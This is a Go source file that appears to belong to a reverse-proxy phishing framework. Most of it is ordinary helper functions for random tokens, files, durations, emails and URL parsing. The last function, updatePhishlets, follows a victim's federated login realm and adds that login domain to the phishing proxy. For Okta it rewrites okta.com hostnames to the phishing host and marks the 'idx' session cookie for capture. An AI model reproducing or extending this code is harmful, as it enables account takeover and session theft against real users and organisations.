package core

import (
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io/fs"
	"io/ioutil"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func GenRandomToken() string {
	rdata := make([]byte, 64)
	rand.Read(rdata)
	hash := sha256.Sum256(rdata)
	token := fmt.Sprintf("%x", hash)
	return token
}

func GenRandomString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func GenRandomAlphanumString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func CreateDir(path string, perm os.FileMode) error {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		err = os.Mkdir(path, perm)
		if err != nil {
			return err
		}
	}
	return nil
}

func ReadFromFile(path string) ([]byte, error) {
	f, err := os.OpenFile(path, os.O_RDONLY, 0644)
	defer f.Close()
	if err != nil {
		return nil, err
	}
	b, err := ioutil.ReadAll(f)
	if err != nil {
		return nil, err
	}
	return b, nil
}

func SaveToFile(b []byte, fpath string, perm fs.FileMode) error {
	file, err := os.OpenFile(fpath, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, perm)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.Write(b)
	if err != nil {
		return err
	}
	return nil
}

func ParseDurationString(s string) (t_dur time.Duration, err error) {
	const DURATION_TYPES = "dhms"

	t_dur = 0
	err = nil

	var days, hours, minutes, seconds int64
	var last_type_index int = -1
	var s_num string
	for _, c := range s {
		if c >= '0' && c <= '9' {
			s_num += string(c)
		} else {
			if len(s_num) > 0 {
				m_index := strings.Index(DURATION_TYPES, string(c))
				if m_index >= 0 {
					if m_index > last_type_index {
						last_type_index = m_index
						var val int64
						val, err = strconv.ParseInt(s_num, 10, 0)
						if err != nil {
							return
						}
						switch c {
						case 'd':
							days = val
						case 'h':
							hours = val
						case 'm':
							minutes = val
						case 's':
							seconds = val
						}
					} else {
						err = fmt.Errorf("you can only use time duration types in following order: 'd' > 'h' > 'm' > 's'")
						return
					}
				} else {
					err = fmt.Errorf("unknown time duration type: '%s', you can use only 'd', 'h', 'm' or 's'", string(c))
					return
				}
			} else {
				err = fmt.Errorf("time duration value needs to start with a number")
				return
			}
			s_num = ""
		}
	}
	t_dur = time.Duration(days)*24*time.Hour + time.Duration(hours)*time.Hour + time.Duration(minutes)*time.Minute + time.Duration(seconds)*time.Second
	return
}

func GetDurationString(t_now time.Time, t_expire time.Time) (ret string) {
	var days, hours, minutes, seconds int64
	ret = ""

	if t_expire.After(t_now) {
		t_dur := t_expire.Sub(t_now)
		if t_dur > 0 {
			days = int64(t_dur / (24 * time.Hour))
			t_dur -= time.Duration(days) * (24 * time.Hour)

			hours = int64(t_dur / time.Hour)
			t_dur -= time.Duration(hours) * time.Hour

			minutes = int64(t_dur / time.Minute)
			t_dur -= time.Duration(minutes) * time.Minute

			seconds = int64(t_dur / time.Second)

			var forcePrint bool = false
			if days > 0 {
				forcePrint = true
				ret += fmt.Sprintf("%dd", days)
			}
			if hours > 0 || forcePrint {
				forcePrint = true
				ret += fmt.Sprintf("%dh", hours)
			}
			if minutes > 0 || forcePrint {
				forcePrint = true
				ret += fmt.Sprintf("%dm", minutes)
			}
			if seconds > 0 || forcePrint {
				forcePrint = true
				ret += fmt.Sprintf("%ds", seconds)
			}
		}
	}
	return
}

func isValidEmail(email string) bool {
	// Trim whitespace
	email = strings.TrimSpace(email)
	if len(email) == 0 {
		return false
	}

	// Regular expression for email validation
	// Matches: local-part@domain.tld
	// - Local part: allows letters, digits, dots, underscores, hyphens, etc.
	// - Domain: allows letters, digits, hyphens, and dots
	// - TLD: at least 2 characters
	re := regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)

	// Check if the email matches the regex
	if !re.MatchString(email) {
		return false
	}

	// Additional checks
	// 1. Ensure no consecutive dots in local part or domain
	if strings.Contains(email, "..") {
		return false
	}

	// 2. Ensure email length is reasonable (e.g., max 254 characters per RFC 5321)
	if len(email) > 254 {
		return false
	}

	// 3. Split email into local part and domain
	parts := strings.Split(email, "@")
	if len(parts) != 2 {
		return false
	}
	localPart, domain := parts[0], parts[1]

	// 4. Local part cannot be empty or exceed 64 characters (per RFC 5321)
	if len(localPart) == 0 || len(localPart) > 64 {
		return false
	}

	// 5. Domain must have at least one dot and a valid TLD
	domainParts := strings.Split(domain, ".")
	if len(domainParts) < 2 {
		return false
	}

	// 6. Each domain part must be non-empty and not start/end with hyphen
	for _, part := range domainParts {
		if len(part) == 0 || strings.HasPrefix(part, "-") || strings.HasSuffix(part, "-") {
			return false
		}
	}

	return true
}

func extractDomainInfo(rawURL string) (subdomain, domain string, err error) {
	// Parse the URL
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		return "", "", err
	}

	// Get the hostname
	host := parsedURL.Hostname()
	if host == "" {
		return "", "", fmt.Errorf("no hostname found in URL")
	}

	// Split the hostname into parts
	parts := strings.Split(host, ".")

	// Handle cases with different numbers of parts
	switch len(parts) {
	case 0, 1:
		return "", "", fmt.Errorf("invalid hostname format")
	case 2:
		// No subdomain (e.g., example.com)
		return "", parts[0] + "." + parts[1], nil
	default:
		// Has subdomain (e.g., sub.example.com)
		// Join all parts except the last two for subdomain
		subdomain := strings.Join(parts[:len(parts)-2], ".")
		// Last two parts form the domain
		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
		return subdomain, domain, nil
	}
}

func updatePhishlets(url string, pl *Phishlet) {
	mailInfo, mailErr := fetchUserRealm(url)
	if mailErr == nil {
		subDomain, domain, domainErr := extractDomainInfo(mailInfo.FederationActiveAuthURL)
		if domainErr == nil {
			for _, ph := range pl.proxyHosts {
				if ph.domain == domain && ph.phish_subdomain == subDomain {
					return
				}
			}

			if domain == "okta.com" {
				pl.proxyHosts = append(pl.proxyHosts, ProxyHost{
					phish_subdomain: subDomain,
					orig_subdomain:  subDomain,
					domain:          domain,
					handle_session:  true,
					is_landing:      false,
					auto_filter:     true,
				})
				pl.cfg.refreshActiveHostnames()

				pl.addSubFilter(subDomain, "", subDomain, []string{"text/html", "application/json", "application/javascript", "application/x-javascript", "application/ecmascript", "text/javascript", "text/ecmascript"}, subDomain+".okta.com", "{hostname}", false, []string{})
				pl.addSubFilter(subDomain, "", subDomain, []string{"text/html", "application/json", "application/javascript", "application/x-javascript", "application/ecmascript", "text/javascript", "text/ecmascript"}, "https.*\\.okta\\.com", "https://{hostname}", false, []string{})

				pl.addCookieAuthTokens(subDomain, []string{"idx"})

			} else {
				pl.proxyHosts = append(pl.proxyHosts, ProxyHost{
					phish_subdomain: subDomain,
					orig_subdomain:  subDomain,
					domain:          domain,
					handle_session:  true,
					is_landing:      false,
				})
				pl.cfg.refreshActiveHostnames()
			}
		}
	}
}
